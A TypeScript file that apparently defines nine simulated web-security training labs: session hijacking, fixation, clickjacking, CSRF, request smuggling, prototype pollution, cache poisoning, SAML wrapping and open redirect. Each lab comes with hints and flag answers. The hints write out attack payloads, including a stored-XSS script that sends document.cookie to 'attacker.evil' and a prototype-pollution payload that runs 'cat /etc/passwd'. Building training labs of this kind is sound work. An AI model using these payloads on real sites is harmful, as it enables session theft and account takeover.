import { dir } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

export const webSessionSecurityLabs: LabScenario[] = [
  // 1 — Session Hijacking via XSS Cookie Theft
  {
    id: 'web-session-hijacking-xss-cookie-theft',
    title: 'Session Hijacking: Stealing a Session Cookie via Stored XSS',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Community-forum09\'s comment field is vulnerable to stored XSS, and — worse — its session cookie is ' +
      'issued without the HttpOnly flag, meaning client-side JavaScript can read it directly. This is the ' +
      'textbook session-hijacking chain covered in OWASP\'s session management guidance: a stored payload runs ' +
      'in a victim\'s browser, exfiltrates their live session cookie to an attacker-controlled endpoint, and the ' +
      'attacker replays that exact cookie value to become the victim — no password, no MFA prompt, no login ' +
      'event of their own at all.',
    objectives: [
      { text: 'nmap -sV 10.10.127.2', why: 'Confirms the forum service before testing its input handling.' },
      {
        text: 'Post a stored XSS payload that would exfiltrate document.cookie',
        why: 'Stored XSS is more dangerous than reflected XSS specifically because it fires for every future visitor — here, a moderator — without the attacker needing to trick anyone into clicking a link.',
      },
      { text: 'Check your exfiltration listener for the stolen cookie', why: 'This is the payoff of the injection: the moderator\'s browser ran your script and shipped their live session identifier straight to you.' },
      {
        text: 'Replay the stolen session cookie against the account dashboard',
        why: 'Because the cookie lacked HttpOnly and the server treats any request bearing a valid session ID as authenticated, presenting the exact same cookie value is functionally identical to being logged in as the moderator — this is what "session hijacking" means in practice.',
      },
    ],
    hints: [
      'nmap -sV 10.10.127.2',
      'curl -X POST -d \'body=<script>fetch("http://attacker.evil/steal?c="+document.cookie)</script>\' 10.10.127.2/comments/post',
      'curl 10.10.127.2/attacker/exfil-log',
      'curl -H "Cookie: session_id=9f83a1c2b7e4d5f6a1b2c3d4e5f6a7b8" 10.10.127.2/account/dashboard',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'community-forum09',
        ip: '10.10.127.2',
        os: 'Ubuntu 22.04 (PHP forum, no HttpOnly cookie flag)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apache httpd 2.4.57',
            http: {
              '/': '<html><body><h1>Community Forum</h1></body></html>',
              '/attacker/exfil-log':
                '[exfil listener] GET /steal?c=session_id%3D9f83a1c2b7e4d5f6a1b2c3d4e5f6a7b8 — from moderator_jsmith\'s browser, 4s after your comment was viewed.',
            },
            vulnRoutes: [
              {
                kind: 'xss',
                path: '/comments/post',
                param: 'body',
                triggerSubstrings: ['<script', 'document.cookie'],
                vulnerableResponse:
                  '{"status":"posted","note":"Stored XSS confirmed — this comment is now permanently rendered on the moderator queue page, no HttpOnly flag on the session cookie means document.cookie is readable. flag{stored_xss_confirmed_cookie_theft_staged}"}',
                normalResponse: '{"status":"posted"}',
              },
              {
                kind: 'auth-bypass',
                path: '/account/dashboard',
                param: 'Cookie',
                location: 'header',
                triggerSubstrings: ['9f83a1c2b7e4d5f6a1b2c3d4e5f6a7b8'],
                vulnerableResponse: '{"status":200,"user":"moderator_jsmith","role":"moderator","note":"flag{session_cookie_replay_hijacks_moderator_account}"}',
                normalResponse: '{"error":"401 Unauthorized - no valid session"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — Session Fixation
  {
    id: 'web-session-fixation-attack',
    title: 'Session Fixation: Pre-Setting a Victim\'s Session ID',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Webmail-portal10 accepts a session ID supplied in the login URL itself and — critically — never rotates ' +
      'it after a successful login. That means an attacker can mint a session ID, send a victim a link ' +
      'containing it, wait for them to log in normally with their own real credentials, and then simply reuse ' +
      'that same pre-chosen session ID to inherit their now-authenticated session. Unlike cookie theft, the ' +
      'attacker never has to intercept or read anything — they chose the session ID before the victim ever logged in.',
    objectives: [
      { text: 'Set a fixed, attacker-chosen session ID via the login URL', why: 'Confirms the application accepts a client-supplied session identifier at all — the precondition for fixation, and something a securely-designed session manager should never allow.' },
      {
        text: 'Simulate the victim logging in normally, then reuse the same fixed session ID',
        why: 'A secure application issues a brand-new session ID at the moment of authentication specifically to defeat this attack — the fact that the pre-set ID still works after login is the actual vulnerability.',
      },
    ],
    hints: [
      'curl "http://10.10.127.3/login?sessionid=ATTACKER_FIXED_00112233"',
      'curl -H "Cookie: sessionid=ATTACKER_FIXED_00112233" 10.10.127.3/account',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'webmail-portal10',
        ip: '10.10.127.3',
        os: 'Ubuntu 20.04 (legacy webmail, session ID never rotated post-login)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.20.1',
            http: { '/': '<html><body><h1>Webmail Portal</h1></body></html>' },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/login',
                param: 'sessionid',
                triggerSubstrings: ['attacker_fixed'],
                vulnerableResponse: '{"status":"session accepted as-is","note":"the app never rejects or replaces a client-supplied session ID. flag{client_supplied_session_id_accepted_fixation_possible}"}',
                normalResponse: '{"status":"new session issued server-side"}',
              },
              {
                kind: 'auth-bypass',
                path: '/account',
                param: 'Cookie',
                location: 'header',
                triggerSubstrings: ['attacker_fixed_00112233'],
                vulnerableResponse: '{"status":200,"user":"victim_employee","note":"flag{session_fixation_inherits_victim_login}"}',
                normalResponse: '{"error":"401 Unauthorized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Clickjacking
  {
    id: 'web-clickjacking-ui-redress',
    title: 'Clickjacking: UI Redress on the Account Deletion Page',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Accountsvc11\'s "delete account" page ships with no X-Frame-Options or CSP frame-ancestors directive, ' +
      'meaning it can be embedded in an invisible iframe layered under a decoy page ("Click here to claim your ' +
      'prize"). A victim who thinks they\'re clicking the decoy button is actually clicking the real, ' +
      'invisibly-overlaid "Delete my account" button underneath — a classic UI-redress attack responsible for ' +
      'numerous real disclosed bounty reports against exactly this kind of unprotected sensitive action page.',
    objectives: [
      { text: 'curl -I 10.10.127.4/account/delete', why: 'Checking response headers for X-Frame-Options / Content-Security-Policy frame-ancestors is the standard first test for clickjacking exposure — their absence is the entire vulnerability.' },
      {
        text: 'Simulate the click-through by sending the confirmation request as the invisible iframe would',
        why: 'Clickjacking\'s real-world impact is that the VICTIM\'s own authenticated browser sends this exact request without realizing it — the overlay trick is just the delivery mechanism for a genuine, credentialed action.',
      },
    ],
    hints: [
      'curl -I 10.10.127.4/account/delete',
      'curl -X POST -d "confirm=true&via=clickjack-overlay" 10.10.127.4/account/delete',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'accountsvc11',
        ip: '10.10.127.4',
        os: 'Ubuntu 22.04 (no clickjacking headers configured)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0',
            http: {
              '/': '<html><body><h1>Account Settings</h1></body></html>',
            },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/account/delete',
                param: 'via',
                triggerSubstrings: ['clickjack-overlay'],
                vulnerableResponse:
                  'HTTP/1.1 200 OK\n(no X-Frame-Options, no Content-Security-Policy: frame-ancestors)\n' +
                  '{"status":"account deleted","note":"the click was captured through an invisible overlay — the victim never knowingly consented. flag{clickjacking_missing_frame_options_deletes_account}"}',
                normalResponse: 'HTTP/1.1 200 OK\n(no X-Frame-Options, no Content-Security-Policy: frame-ancestors)\n{"error":"missing confirmation"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — CSRF token "fail open" bypass
  {
    id: 'web-csrf-token-bypass',
    title: 'CSRF: Bypassing Token Validation by Omitting It Entirely',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Accountsvc12 does check CSRF tokens — but only "if one is present." The validation logic never handles ' +
      'the case where the parameter is missing outright, so it silently processes the request instead of ' +
      'rejecting it. This exact "fail open instead of fail closed" implementation mistake is one of the most ' +
      'common real-world CSRF protection bypasses found in bug bounty programs — the fix looks correct in code ' +
      'review until someone tries simply not sending the parameter at all.',
    objectives: [
      { text: 'Confirm CSRF protection exists by sending an invalid token', why: 'Establishes that the endpoint really does check something, ruling out "there is simply no CSRF protection at all" before looking for a bypass.' },
      {
        text: 'Resend the request with the csrf_token parameter omitted entirely',
        why: 'A validator written as "if the token is present, check it" rather than "the token must always be present and valid" fails open on missing input — exactly the gap that turns a seemingly-protected endpoint into a fully exploitable CSRF target.',
      },
    ],
    hints: [
      'curl -X POST -d "email=victim@example.com&csrf_token=invalid_token" 10.10.127.5/account/update-email',
      'curl -X POST -d "email=attacker@evil.example" 10.10.127.5/account/update-email',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'accountsvc12',
        ip: '10.10.127.5',
        os: 'Ubuntu 22.04 (CSRF middleware fails open on missing token)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0',
            http: {},
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/account/update-email',
                param: 'email',
                triggerSubstrings: ['attacker@evil.example'],
                vulnerableResponse: '{"status":"email updated","new_email":"attacker@evil.example","note":"no csrf_token was supplied and the request was processed anyway. flag{csrf_fail_open_missing_token_hijacks_account_recovery}"}',
                normalResponse: '{"error":"403 Forbidden - invalid CSRF token"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — HTTP Request Smuggling
  {
    id: 'web-http-request-smuggling-desync',
    title: 'HTTP Request Smuggling: Front-End/Back-End Desync',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Checkoutsvc13 sits behind a reverse proxy that disagrees with the origin server about where one HTTP ' +
      'request ends and the next begins — a classic CL.TE desync (the front-end trusts Content-Length, the ' +
      'back-end trusts Transfer-Encoding). This is the exact research area James Kettle\'s "HTTP Desync Attacks" ' +
      'made famous: a single crafted request can smuggle a second, hidden request that gets silently prepended ' +
      'to whatever the NEXT real visitor sends, letting an attacker reach an internal-only endpoint or hijack ' +
      'another user\'s in-flight request.',
    objectives: [
      { text: 'nmap -sV 10.10.127.6', why: 'Confirms the proxied checkout service before probing its request parsing.' },
      {
        text: 'Send a request whose body smuggles a second, hidden request for an internal-only path',
        why: 'The front-end proxy forwards what it believes is one request\'s worth of bytes; the back-end, parsing by a different rule, treats the extra bytes as the start of a brand-new request — reaching /internal/admin, a path never meant to be reachable from outside.',
      },
    ],
    hints: [
      'nmap -sV 10.10.127.6',
      'curl -X POST -d "cart=1&smuggle=GET /internal/admin/rotate-keys HTTP/1.1" 10.10.127.6/api/checkout',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'checkoutsvc13',
        ip: '10.10.127.6',
        os: 'Ubuntu 22.04 (reverse-proxied Node.js checkout, CL.TE desync)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.22.0 (front-end) -> Node.js (origin, CL/TE mismatch)',
            http: {},
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/checkout',
                param: 'smuggle',
                triggerSubstrings: ['get /internal/admin'],
                vulnerableResponse:
                  '{"status":"desync confirmed","smuggled_request_reached":"/internal/admin/rotate-keys",' +
                  '"note":"the front-end proxy and origin disagreed on request boundaries — your smuggled request was prepended to the next real visitor\'s connection. flag{cl_te_desync_smuggles_request_to_internal_admin_path}"}',
                normalResponse: '{"status":"checkout processed"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Prototype Pollution to RCE
  {
    id: 'web-prototype-pollution-rce',
    title: 'Prototype Pollution: From __proto__ Injection to RCE',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Configsvc14\'s settings-merge endpoint recursively merges attacker-supplied JSON into a config object ' +
      'without blocking the special __proto__ key — the same class of bug behind real CVEs in popular ' +
      'JavaScript merge/extend libraries (and behind the 2019 Kibana prototype-pollution RCE, CVE-2019-7609). ' +
      'Polluting Object.prototype directly injects a property onto EVERY object in the running application — ' +
      'first used here to flip an authorization flag, then to reach a dangerous sink that executes a ' +
      'polluted value as a shell command.',
    objectives: [
      { text: 'Pollute Object.prototype with an isAdmin flag via the settings merge endpoint', why: 'Because __proto__ is not blocked, this single merge call adds isAdmin:true to literally every object in the running process — including ones the authorization check reads from, without ever touching your own user record.' },
      {
        text: 'Pollute a "shell" property and trigger the render endpoint that reads it into a dangerous sink',
        why: 'Prototype pollution alone is a bug; it becomes critical only once a "gadget" — code that reads a polluted property into something dangerous, here a shell command — turns it into remote code execution.',
      },
    ],
    hints: [
      'curl -X POST -d \'settings={"__proto__":{"isAdmin":true}}\' 10.10.127.7/api/config/merge',
      'curl -X POST -d \'settings={"__proto__":{"shell":"cat /etc/passwd"}}\' 10.10.127.7/api/config/merge-and-render',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'configsvc14',
        ip: '10.10.127.7',
        os: 'Node.js 20 (recursive merge, __proto__ unblocked)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            http: {},
            vulnRoutes: [
              {
                kind: 'mass-assignment',
                path: '/api/config/merge',
                param: 'settings',
                triggerSubstrings: ['__proto__', 'isadmin'],
                vulnerableResponse: '{"status":"merged","polluted":"Object.prototype.isAdmin = true","note":"flag{prototype_pollution_isadmin_flag_injected_globally}"}',
                normalResponse: '{"status":"merged"}',
              },
              {
                kind: 'mass-assignment',
                path: '/api/config/merge-and-render',
                param: 'settings',
                triggerSubstrings: ['cat /etc/passwd'],
                vulnerableResponse:
                  '{"status":"rendered","shell_output":"root:x:0:0:root:/root:/bin/bash","note":"the polluted shell property was read straight into an exec() sink downstream. flag{prototype_pollution_gadget_reaches_shell_exec_rce}"}',
                normalResponse: '{"status":"rendered","shell_output":null}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 7 — Web Cache Poisoning
  {
    id: 'web-cache-poisoning-unkeyed-header',
    title: 'Web Cache Poisoning via an Unkeyed Header',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Staticfront15 sits behind a caching reverse proxy that keys its cache purely on the URL — but the origin ' +
      'server\'s response varies based on the X-Forwarded-Host header, which the cache never considers part of ' +
      'the key. That mismatch, extensively documented in PortSwigger\'s web cache poisoning research, means a ' +
      'single attacker request with a malicious X-Forwarded-Host value gets cached and then served, unmodified, ' +
      'to every single visitor of that URL until the cache expires — a "fire once, poison everyone" attack with ' +
      'none of the usual per-victim delivery problem other web attacks have.',
    objectives: [
      { text: 'curl 10.10.127.8/home', why: 'Establishes the normal, unpoisoned cached response first.' },
      {
        text: 'Send a request with a malicious X-Forwarded-Host header and confirm it gets cached for everyone',
        why: 'Because the cache key ignores this header entirely, your single poisoned response becomes the response every other visitor receives — turning one attacker request into a mass-impact attack with no victim interaction required at all.',
      },
    ],
    hints: [
      'curl 10.10.127.8/home',
      'curl -H "X-Forwarded-Host: evil.attacker.example" 10.10.127.8/home',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'staticfront15',
        ip: '10.10.127.8',
        os: 'Ubuntu 22.04 (CDN-style cache, unkeyed X-Forwarded-Host)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Varnish 7.3 (cache) -> origin app',
            http: { '/home': '<html><head><link rel="canonical" href="https://staticfront15.example/home"></head><body>Home</body></html>' },
            vulnRoutes: [
              {
                kind: 'ssrf',
                path: '/home',
                param: 'X-Forwarded-Host',
                location: 'header',
                triggerSubstrings: ['evil.attacker.example'],
                vulnerableResponse:
                  '<html><head><link rel="canonical" href="https://evil.attacker.example/home"></head><body>Home</body></html>\n' +
                  'X-Cache: MISS (now cached for ALL future visitors of /home)\n' +
                  'flag{cache_poisoning_unkeyed_xfh_header_poisons_shared_cache}',
                normalResponse: '<html><head><link rel="canonical" href="https://staticfront15.example/home"></head><body>Home</body></html>\nX-Cache: HIT',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 8 — SAML XML Signature Wrapping
  {
    id: 'web-saml-xml-signature-wrapping',
    title: 'SAML: XML Signature Wrapping Authentication Bypass',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Ssosvc16\'s SAML consumer validates that A signature somewhere in the response is valid, but not that the ' +
      'signed element is the SAME element it reads the user\'s identity and role from. XML Signature Wrapping ' +
      '(XSW) — extensively documented in the 2012 academic paper "On Breaking SAML: Be Whoever You Want to Be" ' +
      'and behind numerous real CVEs in SAML libraries since — exploits exactly that gap: take your own ' +
      'legitimately-signed, low-privilege assertion, relocate it elsewhere in the document, and insert a forged ' +
      'admin assertion in the position the parser actually reads identity from. The signature still verifies; ' +
      'the identity it approves is not the identity that was signed.',
    objectives: [
      { text: 'Log in normally with a legitimately-signed viewer-role assertion', why: 'Confirms the baseline SSO flow and gives you a real, validly-signed assertion to abuse in the next step.' },
      {
        text: 'Submit an XML-signature-wrapped assertion claiming the admin role',
        why: 'The parser finds a valid signature (over the relocated original assertion) and separately reads the user\'s role from the forged, unsigned element sitting where it expects identity data — the two checks target different parts of the document, and neither alone catches the mismatch.',
      },
    ],
    hints: [
      'curl -X POST -d "SAMLResponse=signed-assertion-role-viewer-valid" 10.10.127.9/sso/consume',
      'curl -X POST -d "SAMLResponse=xsw-wrapped-assertion-forged-role-admin" 10.10.127.9/sso/consume-admin',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'ssosvc16',
        ip: '10.10.127.9',
        os: 'Ubuntu 22.04 (SAML SP, vulnerable to XML Signature Wrapping)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 (SAML consumer endpoint)',
            http: {},
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/sso/consume',
                param: 'SAMLResponse',
                triggerSubstrings: ['signed-assertion-role-viewer-valid'],
                vulnerableResponse: '{"status":"authenticated","role":"viewer","note":"flag{saml_baseline_signed_assertion_accepted}"}',
                normalResponse: '{"error":"invalid SAMLResponse"}',
              },
              {
                kind: 'auth-bypass',
                path: '/sso/consume-admin',
                param: 'SAMLResponse',
                triggerSubstrings: ['xsw-wrapped-assertion-forged-role-admin'],
                vulnerableResponse:
                  '{"status":"authenticated","role":"admin","note":"signature validated against the relocated original assertion, ' +
                  'but identity was read from the forged wrapper element instead. flag{xml_signature_wrapping_forges_admin_role}"}',
                normalResponse: '{"error":"invalid SAMLResponse"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 9 — Open Redirect for Phishing Link Legitimacy
  {
    id: 'web-open-redirect-phishing-chain',
    title: 'Open Redirect: Weaponizing a Trusted Domain for Phishing',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'Trustedbank17\'s own /redirect endpoint will forward a visitor to ANY external URL supplied in its "url" ' +
      'parameter. On its own that looks low-severity — but it is one of the most abused bug classes in real ' +
      'phishing campaigns specifically because of what a victim SEES: a link starting with the trusted bank\'s ' +
      'own real domain name, which passes a glance, an email spam filter\'s domain-reputation check, and even a ' +
      'hover-preview — right up until it silently forwards to an attacker-controlled credential-harvesting ' +
      'clone. The redirect is the whole attack; there is no injection or authentication bypass involved at all.',
    objectives: [
      { text: 'Confirm the redirect endpoint works for a legitimate destination', why: 'Establishes the expected, benign behavior of the feature before showing it accepts anywhere at all.' },
      {
        text: 'Confirm the same endpoint forwards to an arbitrary attacker-controlled domain',
        why: 'A real phishing email built around this link reads as "trustedbank17.example/redirect?url=..." at a glance — the victim\'s trust in the visible domain name is exactly what makes an open redirect on a trusted brand so much more dangerous than a generic phishing link.',
      },
    ],
    hints: [
      'curl "http://10.10.127.10/redirect?url=https://trustedbank17.example/login"',
      'curl "http://10.10.127.10/redirect?url=https://attacker-phish.evil/fake-login"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'trustedbank17',
        ip: '10.10.127.10',
        os: 'Ubuntu 22.04 (unrestricted open redirect)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0',
            http: {},
            vulnRoutes: [
              {
                kind: 'ssrf',
                path: '/redirect',
                param: 'url',
                triggerSubstrings: ['attacker-phish.evil'],
                vulnerableResponse:
                  'HTTP/1.1 302 Found\nLocation: https://attacker-phish.evil/fake-login\n' +
                  'note: the visible link a victim sees is trustedbank17.example/redirect?url=... — the trusted domain name is what defeats their suspicion.\n' +
                  'flag{open_redirect_weaponizes_trusted_domain_for_phishing}',
                normalResponse: 'HTTP/1.1 302 Found\nLocation: https://trustedbank17.example/login',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
